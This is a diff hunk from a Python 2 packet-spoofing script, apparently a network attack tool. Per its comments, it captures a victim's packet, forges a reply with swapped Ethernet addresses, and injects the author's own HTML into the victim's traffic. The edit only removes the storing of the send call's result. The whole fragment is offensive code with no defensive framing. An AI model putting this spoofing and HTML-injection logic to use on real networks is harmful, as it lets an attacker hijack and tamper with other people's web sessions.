@@ -42,7 +42,7 @@ def start(times):
 def inject(p): # got packet, inject my html
     response = forge_response(p)
     print 'Spoofed Response: ' + str(response[IP].src) + '->' + str(response[IP].dst)
-    fin_ack = sendp(response) # send spoofed response, waiting for victim's fin-ack
+    sendp(response) # send spoofed response
             
 def forge_response(p):
     ether = Ether(src=p[Ether].dst, dst=p[Ether].src) # switch ethernet direction
